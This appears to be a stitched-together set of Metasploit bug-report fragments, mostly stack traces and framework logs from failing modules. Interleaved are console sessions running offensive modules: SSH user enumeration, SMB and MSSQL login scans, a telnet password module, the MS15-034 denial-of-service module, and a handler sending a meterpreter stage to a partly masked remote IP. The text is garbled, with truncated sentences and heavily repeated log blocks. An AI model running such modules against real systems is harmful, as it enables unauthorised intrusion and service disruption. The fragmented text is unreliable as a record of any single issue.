msf5 auxiliary(scanner/ssh/ssh_enumusers) > show options module options (auxiliary/scanner/ssh/ssh_enumusers): name current setting required description ---- --------------- -------- ----------- check_false false no check for false positives (random username) proxies no a proxy chain of format type:host:port[,type:host:port][...] rhosts yes the target address range or cidr identifier rport 22 yes the target port threads 1 yes the number of concurrent threads threshold 10 yes amount of seconds needed before a user is considered found (timing attack only) username no single username to test (username spray) user_file no file containing usernames, one per line auxiliary action: name description ---- ----------- malformed packet use a malformed packet msf5 auxiliary(scanner/ssh/ssh_enumusers) > set rhosts 192.168.99.102
rhosts => 192.168.99.102
msf5 auxiliary(scanner/ssh/ssh_enumusers) > set username root
username => root
msf5 auxiliary(scanner/ssh/ssh_enumusers) > run
[-] auxiliary failed: msf::missingactionerror invalid action: please use: malformed packet, timing attack
``` ## system stuff
error is generated:
[-] auxiliary failed: option rhosts failed to validate
line 128 generates the errror: embedded/framework/lib/msf/ui/console/command_dispatcher/auxiliary.rb looking one version back, there is a big difference in code
however, both 4a and 5 socket server scripts are still the same
in version framework: 4.17.29-dev, console : 4.17.29-dev everything was still working fine
## system stuff
the creds list is now broken for this workspace ## system stuff
crashes when it finds a password you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ```
[02/18/2019 15:15:06] [e(0)] core: thread exception: scannerhost(scanner/telnet/lantronix_telnet_password)-172.12.34.567 critical=false error: nomethoderror undefined method `id' for nil:nilclass source: /opt/metasploit-framework/embedded/framework/lib/msf/core/auxiliary/scanner.rb:105:in `block in run' /opt/metasploit-framework/embedded/framework/lib/msf/core/auxiliary/scanner.rb:92:in `loop' /opt/metasploit-framework/embedded/framework/lib/msf/core/auxiliary/scanner.rb:92:in `run' /opt/metasploit-framework/embedded/framework/lib/msf/base/simple/auxiliary.rb:140:in `job_run_proc' /opt/metasploit-framework/embedded/framework/lib/msf/base/simple/auxiliary.rb:82:in `run_simple' /opt/metasploit-framework/embedded/framework/lib/msf/base/simple/auxiliary.rb:92:in `run_simple' /opt/metasploit-framework/embedded/framework/lib/msf/ui/console/command_dispatcher/auxiliary.rb:109:in `cmd_run' /opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:502:in `run_command' /opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:453:in `block in run_single' /opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:447:in `each' /opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:447:in `run_single' /opt/metasploit-framework/embedded/framework/lib/rex/ui/text/shell.rb:151:in `run' /opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/console.rb:48:in `start' /opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/base.rb:82:in `start' /opt/metasploit-framework/bin/../embedded/framework/msfconsole:49:in `<main>'
[02/18/2019 15:15:06] [e(0)] core: call stack
/opt/metasploit-framework/embedded/framework/lib/msf/core/auxiliary/report.rb:84:in `myworkspace_id'
/opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/telnet/lantronix_telnet_password.rb:80:in `run_host'
/opt/metasploit-framework/embedded/framework/lib/msf/core/auxiliary/scanner.rb:111:in `block (2 levels) in run'
/opt/metasploit-framework/embedded/framework/lib/msf/core/thread_manager.rb:106:in `block in spawn'
[02/18/2019 15:15:06] [e(0)] core: auxiliary failed: nomethoderror undefined method `id' for nil:nilclass
``` ## system stuff
the connection established then closed immediately.
msf5 exploit(multi/handler) > exploit [*] started bind tcp handler against 27.*.*.191:4445
[*] sending stage (475136 bytes) to 27.*.*.191
[*] starting local tcp relay on 127.0.0.1:4545...
[*] local tcp relay started.
[*] launched vncviewer.
[*] vnc connection closed.
/usr/bin/vncviewer: vnc server closed connection
[*] session 17 created in the background.
this is the log:
[02/15/2019 23:28:18] [e(0)] rex: error in #<rex::services::localrelay: > monitor_relays read: end of file reached
``` ## system stuff
hosts created during the scan that have a successful login have a `null` state ## system stuff
falls over with this error: ```
[-] 1.2.3.4:1433 - unable to parse encryption req during pre-login, this may not be a mssql server
[-] auxiliary failed: nomethoderror undefined method `[]' for false:falseclass
[-] call stack:
[-] /root/tools/metasploit-framework/lib/metasploit/framework/mssql/client.rb:154:in `mssql_login'
[-] /root/tools/metasploit-framework/lib/metasploit/framework/login_scanner/mssql.rb:50:in `attempt_login'
[-] /root/tools/metasploit-framework/lib/metasploit/framework/login_scanner/base.rb:231:in `block in scan!'
[-] /root/tools/metasploit-framework/lib/metasploit/framework/login_scanner/base.rb:154:in `block in each_credential'
[-] /root/tools/metasploit-framework/lib/metasploit/framework/credential_collection.rb:121:in `each'
[-] /root/tools/metasploit-framework/lib/metasploit/framework/login_scanner/base.rb:141:in `each_credential'
[-] /root/tools/metasploit-framework/lib/metasploit/framework/login_scanner/base.rb:205:in `scan!'
[-] /root/tools/metasploit-framework/modules/auxiliary/scanner/mssql/mssql_login.rb:71:in `run_host'
[-] /root/tools/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:111:in `block (2 levels) in run'
[-] /root/tools/metasploit-framework/lib/msf/core/thread_manager.rb:106:in `block in spawn'
``` i've had similar errors with other mssql modules but haven't tried those since i upgraded to the latest version
## system stuff
the command fails with `[-] please specify valid session identifier(s)` ## system stuff
failed to authenticate
## system stuff
a crash or a hang occurs sometimes immediately upon startup or sometimes after a short sequence of commands
most often, program dies with the message
"[fatal] failed to allocate memory" other times, it will simply hang and become unresponsive, or occasionally segmentation fault.
occurs on both of my systems (one physical, one virtual) in the same way (systems details at end)
a crash occurs either right away or after a short sequence of commands
here is a typical example:
> root@kalivm:~# msfdb run
> msf5 > use auxiliary/scanner/smb/smb2
> msf5 auxiliary(scanner/smb/smb2) > setg rhosts 10.10.10.103
> rhosts => 10.10.10.103
> msf5 auxiliary(scanner/smb/smb2) > run
> [+] 10.10.10.103:445 - 10.10.10.103 supports smb 2 [dialect 255.2] and has been online for 33 hours
> **[fatal] failed to allocate memory**
> see following transcript for **segmentation fault** on "show all"
[show-all-segfault-transcript.txt]( ## system stuff
during execution an error is reported that shows "undefined local variable or method \'args\'" you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ## system stuff
meterpreter > ls
[-] stdapi_fs_ls: operation failed: unknown error
[01/01/2019 19:58:21] [e(0)] meterpreter: stdapi_fs_ls: operation failed: unknown error
[01/01/2019 19:58:21] [d(0)] meterpreter: call stack:
/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/fs/dir.rb:80:in `entries_with_info'
/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/fs.rb:629:in `list_path'
/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/fs.rb:735:in `cmd_ls'
``` ### os linux
error message above..
"nc: invalid option -- \'j\'"
you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ## system stuff
/opt/metasploit-framework/embedded/framework/modules/payloads/singles/bsd/vax/shell_reverse_tcp.rb:24:in `initialize': uninitialized constant msf::handler::reversetcp (nameerror) from /opt/metasploit-framework/embedded/framework/lib/msf/core/payload_set.rb:198:in `new' from /opt/metasploit-framework/embedded/framework/lib/msf/core/payload_set.rb:198:in `add_module' from /opt/metasploit-framework/embedded/framework/lib/msf/core/module_manager/loading.rb:73:in `on_module_load' from /opt/metasploit-framework/embedded/framework/lib/msf/core/modules/loader/base.rb:183:in `load_module' from /opt/metasploit-framework/embedded/framework/lib/msf/core/modules/loader/base.rb:238:in `block in load_modules' from /opt/metasploit-framework/embedded/framework/lib/msf/core/modules/loader/directory.rb:49:in `block (2 levels) in each_module_reference_name' from /opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rex-core-0.1.13/lib/rex/file.rb:133:in `block in find' from /opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rex-core-0.1.13/lib/rex/file.rb:132:in `catch' from /opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rex-core-0.1.13/lib/rex/file.rb:132:in `find' from /opt/metasploit-framework/embedded/framework/lib/msf/core/modules/loader/directory.rb:40:in `block in each_module_reference_name' from /opt/metasploit-framework/embedded/framework/lib/msf/core/modules/loader/directory.rb:30:in `foreach' from /opt/metasploit-framework/embedded/framework/lib/msf/core/modules/loader/directory.rb:30:in `each_module_reference_name' from /opt/metasploit-framework/embedded/framework/lib/msf/core/modules/loader/base.rb:237:in `load_modules' from /opt/metasploit-framework/embedded/framework/lib/msf/core/module_manager/loading.rb:119:in `block in load_modules' from /opt/metasploit-framework/embedded/framework/lib/msf/core/module_manager/loading.rb:117:in `each' from /opt/metasploit-framework/embedded/framework/lib/msf/core/module_manager/loading.rb:117:in `load_modules' from /opt/metasploit-framework/embedded/framework/lib/msf/core/module_manager/module_paths.rb:41:in `block in add_module_path' from /opt/metasploit-framework/embedded/framework/lib/msf/core/module_manager/module_paths.rb:40:in `each' from /opt/metasploit-framework/embedded/framework/lib/msf/core/module_manager/module_paths.rb:40:in `add_module_path' from /opt/metasploit-framework/embedded/framework/lib/msf/base/simple/framework/module_paths.rb:50:in `block in init_module_paths' from /opt/metasploit-framework/embedded/framework/lib/msf/base/simple/framework/module_paths.rb:49:in `each' from /opt/metasploit-framework/embedded/framework/lib/msf/base/simple/framework/module_paths.rb:49:in `init_module_paths' from /opt/metasploit-framework/embedded/framework/lib/msf/ui/console/driver.rb:199:in `initialize' from /opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/console.rb:62:in `new' from /opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/console.rb:62:in `driver' from /opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/console.rb:48:in `start' from /opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/base.rb:82:in `start' from /opt/metasploit-framework/bin/../embedded/framework/msfconsole:49:in `<main>'
[-] error while running command wmap_sites: problem reporting website: opts must include a valid :workspace
see log for more details
call stack:
/home/oytun/pentest/exploits/metasploit-framework/lib/metasploit/framework/data_service/proxy/core.rb:174:in `log_error'
/home/oytun/pentest/exploits/metasploit-framework/lib/metasploit/framework/data_service/proxy/web_data_proxy.rb:8:in `rescue in report_web_site'
/home/oytun/pentest/exploits/metasploit-framework/lib/metasploit/framework/data_service/proxy/web_data_proxy.rb:2:in `report_web_site'
/home/oytun/pentest/exploits/metasploit-framework/plugins/wmap.rb:1347:in `add_web_site'
/home/oytun/pentest/exploits/metasploit-framework/plugins/wmap.rb:132:in `cmd_wmap_sites'
/home/oytun/pentest/exploits/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:502:in `run_command'
/home/oytun/pentest/exploits/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:453:in `block in run_single'
/home/oytun/pentest/exploits/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:447:in `each'
/home/oytun/pentest/exploits/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:447:in `run_single'
/home/oytun/pentest/exploits/metasploit-framework/lib/rex/ui/text/shell.rb:151:in `run'
/home/oytun/pentest/exploits/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
/home/oytun/pentest/exploits/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
/home/oytun/pentest/exploits/metasploit-framework/msfconsole:49:in `<main>'
``` ~/.msf4/logs$ cat framework.log;
[11/21/2018 11:49:09] [d(0)] core: created user based module store
[11/21/2018 11:49:59] [e(0)] core: problem reporting website: opts must include a valid :workspace
[11/21/2018 11:49:59] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/msf/util/db_manager.rb:35:in `process_opts_workspace'
[11/21/2018 11:49:59] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/msf/core/db_manager/web.rb:191:in `block in report_web_site'
[11/21/2018 11:49:59] [e(0)] core: /var/lib/gems/2.5.0/gems/activerecord-4.2.10/lib/active_record/connection_adapters/abstract/connection_pool.rb:292:in `with_connection'
[11/21/2018 11:49:59] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/msf/core/db_manager/web.rb:190:in `report_web_site'
[11/21/2018 11:49:59] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/metasploit/framework/data_service/proxy/web_data_proxy.rb:5:in `block in report_web_site'
[11/21/2018 11:49:59] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/metasploit/framework/data_service/proxy/core.rb:166:in `data_service_operation'
[11/21/2018 11:49:59] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/metasploit/framework/data_service/proxy/web_data_proxy.rb:4:in `report_web_site'
[11/21/2018 11:49:59] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/plugins/wmap.rb:1347:in `add_web_site'
[11/21/2018 11:49:59] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/plugins/wmap.rb:132:in `cmd_wmap_sites'
[11/21/2018 11:49:59] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:502:in `run_command'
[11/21/2018 11:49:59] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:453:in `block in run_single'
[11/21/2018 11:49:59] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:447:in `each'
[11/21/2018 11:49:59] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:447:in `run_single'
[11/21/2018 11:49:59] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/rex/ui/text/shell.rb:151:in `run'
[11/21/2018 11:49:59] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
[11/21/2018 11:49:59] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
[11/21/2018 11:49:59] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/msfconsole:49:in `<main>'
[11/21/2018 11:50:22] [e(0)] core: problem reporting website: opts must include a valid :workspace
[11/21/2018 11:50:22] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/msf/util/db_manager.rb:35:in `process_opts_workspace'
[11/21/2018 11:50:22] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/msf/core/db_manager/web.rb:191:in `block in report_web_site'
[11/21/2018 11:50:22] [e(0)] core: /var/lib/gems/2.5.0/gems/activerecord-4.2.10/lib/active_record/connection_adapters/abstract/connection_pool.rb:292:in `with_connection'
[11/21/2018 11:50:22] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/msf/core/db_manager/web.rb:190:in `report_web_site'
[11/21/2018 11:50:22] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/metasploit/framework/data_service/proxy/web_data_proxy.rb:5:in `block in report_web_site'
[11/21/2018 11:50:22] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/metasploit/framework/data_service/proxy/core.rb:166:in `data_service_operation'
[11/21/2018 11:50:22] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/metasploit/framework/data_service/proxy/web_data_proxy.rb:4:in `report_web_site'
[11/21/2018 11:50:22] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/plugins/wmap.rb:1347:in `add_web_site'
[11/21/2018 11:50:22] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/plugins/wmap.rb:132:in `cmd_wmap_sites'
[11/21/2018 11:50:22] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:502:in `run_command'
[11/21/2018 11:50:22] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:453:in `block in run_single'
[11/21/2018 11:50:22] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:447:in `each'
[11/21/2018 11:50:22] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:447:in `run_single'
[11/21/2018 11:50:22] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/rex/ui/text/shell.rb:151:in `run'
[11/21/2018 11:50:22] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
[11/21/2018 11:50:22] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
[11/21/2018 11:50:22] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/msfconsole:49:in `<main>'
[11/21/2018 11:52:09] [e(0)] core: problem reporting website: opts must include a valid :workspace
[11/21/2018 11:52:09] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/msf/util/db_manager.rb:35:in `process_opts_workspace'
[11/21/2018 11:52:09] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/msf/core/db_manager/web.rb:191:in `block in report_web_site'
[11/21/2018 11:52:09] [e(0)] core: /var/lib/gems/2.5.0/gems/activerecord-4.2.10/lib/active_record/connection_adapters/abstract/connection_pool.rb:292:in `with_connection'
[11/21/2018 11:52:09] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/msf/core/db_manager/web.rb:190:in `report_web_site'
[11/21/2018 11:52:09] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/metasploit/framework/data_service/proxy/web_data_proxy.rb:5:in `block in report_web_site'
[11/21/2018 11:52:09] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/metasploit/framework/data_service/proxy/core.rb:166:in `data_service_operation'
[11/21/2018 11:52:09] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/metasploit/framework/data_service/proxy/web_data_proxy.rb:4:in `report_web_site'
[11/21/2018 11:52:09] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/plugins/wmap.rb:1347:in `add_web_site'
[11/21/2018 11:52:09] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/plugins/wmap.rb:132:in `cmd_wmap_sites'
[11/21/2018 11:52:09] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:502:in `run_command'
[11/21/2018 11:52:09] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:453:in `block in run_single'
[11/21/2018 11:52:09] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:447:in `each'
[11/21/2018 11:52:09] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:447:in `run_single'
[11/21/2018 11:52:09] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/rex/ui/text/shell.rb:151:in `run'
[11/21/2018 11:52:09] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
[11/21/2018 11:52:09] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
[11/21/2018 11:52:09] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/msfconsole:49:in `<main>'
[11/21/2018 11:55:38] [e(0)] core: problem reporting website: opts must include a valid :workspace
[11/21/2018 11:55:38] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/msf/util/db_manager.rb:35:in `process_opts_workspace'
[11/21/2018 11:55:38] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/msf/core/db_manager/web.rb:191:in `block in report_web_site'
[11/21/2018 11:55:38] [e(0)] core: /var/lib/gems/2.5.0/gems/activerecord-4.2.10/lib/active_record/connection_adapters/abstract/connection_pool.rb:292:in `with_connection'
[11/21/2018 11:55:38] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/msf/core/db_manager/web.rb:190:in `report_web_site'
[11/21/2018 11:55:38] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/metasploit/framework/data_service/proxy/web_data_proxy.rb:5:in `block in report_web_site'
[11/21/2018 11:55:38] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/metasploit/framework/data_service/proxy/core.rb:166:in `data_service_operation'
[11/21/2018 11:55:38] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/metasploit/framework/data_service/proxy/web_data_proxy.rb:4:in `report_web_site'
[11/21/2018 11:55:38] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/plugins/wmap.rb:1347:in `add_web_site'
[11/21/2018 11:55:38] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/plugins/wmap.rb:132:in `cmd_wmap_sites'
[11/21/2018 11:55:38] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:502:in `run_command'
[11/21/2018 11:55:38] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:453:in `block in run_single'
[11/21/2018 11:55:38] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:447:in `each'
[11/21/2018 11:55:38] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:447:in `run_single'
[11/21/2018 11:55:38] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/rex/ui/text/shell.rb:151:in `run'
[11/21/2018 11:55:38] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
[11/21/2018 11:55:38] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
[11/21/2018 11:55:38] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/msfconsole:49:in `<main>'
[11/21/2018 11:55:42] [e(0)] core: problem reporting website: opts must include a valid :workspace
[11/21/2018 11:55:42] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/msf/util/db_manager.rb:35:in `process_opts_workspace'
[11/21/2018 11:55:42] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/msf/core/db_manager/web.rb:191:in `block in report_web_site'
[11/21/2018 11:55:42] [e(0)] core: /var/lib/gems/2.5.0/gems/activerecord-4.2.10/lib/active_record/connection_adapters/abstract/connection_pool.rb:292:in `with_connection'
[11/21/2018 11:55:42] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/msf/core/db_manager/web.rb:190:in `report_web_site'
[11/21/2018 11:55:42] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/metasploit/framework/data_service/proxy/web_data_proxy.rb:5:in `block in report_web_site'
[11/21/2018 11:55:42] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/metasploit/framework/data_service/proxy/core.rb:166:in `data_service_operation'
[11/21/2018 11:55:42] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/metasploit/framework/data_service/proxy/web_data_proxy.rb:4:in `report_web_site'
[11/21/2018 11:55:42] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/plugins/wmap.rb:1347:in `add_web_site'
[11/21/2018 11:55:42] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/plugins/wmap.rb:132:in `cmd_wmap_sites'
[11/21/2018 11:55:42] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:502:in `run_command'
[11/21/2018 11:55:42] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:453:in `block in run_single'
[11/21/2018 11:55:42] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:447:in `each'
[11/21/2018 11:55:42] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:447:in `run_single'
[11/21/2018 11:55:42] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/rex/ui/text/shell.rb:151:in `run'
[11/21/2018 11:55:42] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
[11/21/2018 11:55:42] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
[11/21/2018 11:55:42] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/msfconsole:49:in `<main>'
[11/21/2018 11:55:44] [e(0)] core: problem reporting website: opts must include a valid :workspace
[11/21/2018 11:55:44] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/msf/util/db_manager.rb:35:in `process_opts_workspace'
[11/21/2018 11:55:44] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/msf/core/db_manager/web.rb:191:in `block in report_web_site'
[11/21/2018 11:55:44] [e(0)] core: /var/lib/gems/2.5.0/gems/activerecord-4.2.10/lib/active_record/connection_adapters/abstract/connection_pool.rb:292:in `with_connection'
[11/21/2018 11:55:44] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/msf/core/db_manager/web.rb:190:in `report_web_site'
[11/21/2018 11:55:44] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/metasploit/framework/data_service/proxy/web_data_proxy.rb:5:in `block in report_web_site'
[11/21/2018 11:55:44] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/metasploit/framework/data_service/proxy/core.rb:166:in `data_service_operation'
[11/21/2018 11:55:44] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/metasploit/framework/data_service/proxy/web_data_proxy.rb:4:in `report_web_site'
[11/21/2018 11:55:44] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/plugins/wmap.rb:1347:in `add_web_site'
[11/21/2018 11:55:44] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/plugins/wmap.rb:132:in `cmd_wmap_sites'
[11/21/2018 11:55:44] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:502:in `run_command'
[11/21/2018 11:55:44] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:453:in `block in run_single'
[11/21/2018 11:55:44] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:447:in `each'
[11/21/2018 11:55:44] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:447:in `run_single'
[11/21/2018 11:55:44] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/rex/ui/text/shell.rb:151:in `run'
[11/21/2018 11:55:44] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
[11/21/2018 11:55:44] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
[11/21/2018 11:55:44] [e(0)] core: /home/oytun/pentest/exploits/metasploit-framework/msfconsole:49:in `<main>'
``` ## system stuff
errors out ```
msf auxiliary(dos/http/ms15_034_ulonglongadd) > run [-] auxiliary failed: nomethoderror undefined method `code' for nil:nilclass
[-] call stack:
[-] /usr/share/metasploit-framework/modules/auxiliary/dos/http/ms15_034_ulonglongadd.rb:154:in `block in check_host'
[-] /usr/share/metasploit-framework/modules/auxiliary/dos/http/ms15_034_ulonglongadd.rb:143:in `each'
[-] /usr/share/metasploit-framework/modules/auxiliary/dos/http/ms15_034_ulonglongadd.rb:143:in `check_host'
[-] /usr/share/metasploit-framework/modules/auxiliary/dos/http/ms15_034_ulonglongadd.rb:54:in `run_host'
[-] /usr/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:135:in `block (2 levels) in run'
[-] /usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:106:in `block in spawn'
[*] auxiliary module execution completed ``` ## system stuff
metasploit on kali kali 2018.4
framework: 4.17.25-dev
console : 4.17.25-dev
payload generates, but outputting to elf format fails.
no output is generated, the error message `"error: the payload could not be generated, check options" ` is displayed
## system stuff
[-] error while running command info: undefined method `notes' for #<msf::modules::mod6578706c6f69742f6d756c74692f68616e646c6572::metasploitmodule: > call stack:
/usr/share/metasploit-framework/lib/msf/core/module/side_effects.rb:7:in `side_effects'
/usr/share/metasploit-framework/lib/msf/core/module/side_effects.rb:12:in `side_effects'
/usr/share/metasploit-framework/lib/msf/base/serializer/readable_text.rb:161:in `dump_traits'
/usr/share/metasploit-framework/lib/msf/base/serializer/readable_text.rb:212:in `dump_exploit_module'
/usr/share/metasploit-framework/lib/msf/base/serializer/readable_text.rb:30:in `dump_module'
/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/modules.rb:134:in `cmd_info'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:501:in `run_command'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:453:in `block in run_single'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:447:in `each'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:447:in `run_single'
/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:151:in `run'
/usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
/usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
/usr/bin/msfconsole:49:in `<main>' ``` ## system stuff
